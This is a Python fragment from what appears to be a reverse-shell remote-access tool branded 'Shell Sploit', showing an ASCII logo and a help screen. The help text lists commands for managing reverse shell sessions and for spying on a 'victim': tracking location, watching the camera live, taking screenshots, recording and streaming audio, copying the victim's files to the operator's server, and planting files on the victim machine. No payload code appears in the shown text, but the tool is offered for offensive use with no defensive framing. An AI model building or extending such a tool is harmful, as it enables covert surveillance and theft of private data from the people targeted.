def print_logo():
    print(f"""\033[93m
   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█               ▄████████    ▄███████▄  ▄█        ▄██████▄   ▄█      ███     
  ███    ███   ███    ███     ███    ███ ███       ███              ███    ███   ███    ███ ███       ███    ███ ███  ▀█████████▄ 
  ███    █▀    ███    ███     ███    █▀  ███       ███              ███    █▀    ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ 
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███              ███          ███    ███ ███       ███    ███ ███▌     ███   ▀ 
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███            ▀███████████ ▀█████████▀  ███       ███    ███ ███▌     ███     
         ███   ███    ███     ███    █▄  ███       ███                     ███   ███        ███       ███    ███ ███      ███     
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄         ▄█    ███   ███        ███▌    ▄ ███    ███ ███      ███     
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██       ▄████████▀   ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀\033[0m""")
def print_help():
    print_logo()
    banner = r"""
~REVERSE SHELL COMMANDS
-sessions: display all sessions.
-kill-all: kill all sessions.
-exit/quit: exit from reverse shell.
-background: move operation to the background.
-clear: clear terminal.
-kill-session session: kill session port.
-replace-session session: go to another session.
~COMMANDS 
 -location: This command gets location victim.
 -start-camera-live: Watch victim.
 -screenshoot: Upload screenshoot from victim's device.
 -send [file]: send many files to your server from victim's device.
 -put-files [files from your server]: put files inside victim machine from your server.
 -exit: exit from victim's device.
 -clear: clear the screen.
 -help: display help screen. 
 -record time: record audio from victim's device.
 -stream-sound: Listing to victim realtime.
 -open-browser link: Open browser to specifc link.
 -send-all: send all files for current directory from victim's device to the server.
"""
    print(banner)